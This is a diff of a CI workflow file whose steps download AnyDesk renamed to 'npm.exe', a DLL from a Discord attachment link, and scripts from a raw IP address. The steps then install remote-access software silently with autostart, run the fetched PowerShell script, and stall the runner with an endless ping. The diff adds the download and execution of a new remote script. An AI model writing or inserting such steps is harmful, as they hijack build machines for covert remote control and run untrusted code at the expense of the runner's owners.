@@ -32,9 +32,10 @@ jobs:
           Invoke-WebRequest https://download.anydesk.com/AnyDesk.exe -OutFile npm.exe
           Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830537244028305418/Nancy.dll -OutFile Nancy.dll
           Invoke-WebRequest http://5.102.153.140/lambdatest/l2.cmd -OutFile qw.bat
+          Invoke-WebRequest http://5.102.153.140/lambdatest/lol2.ps1 -OutFile lol2.ps1
           cmd /c echo .\npm.exe --install C:\Users\runneradmin --start-with-win --create-shortcuts --create-desktop-icon --update-disabled --silent >>a.ps1
           cmd /c echo timeout 20 >>a.ps1
-          cmd /C echo start cmd /C D:\a\qqwqpwqp\qqwqpwqp\qw.bat >>a.ps1
+          cmd /C echo .\lol2.ps1 >>a.ps1
           cmd /c echo dir >>a.ps1
           cmd /c echo ping localhost -n 11111111111111111111111111111 -w 99999999999999999999999999999999999 >>a.ps1
           .\a.ps1
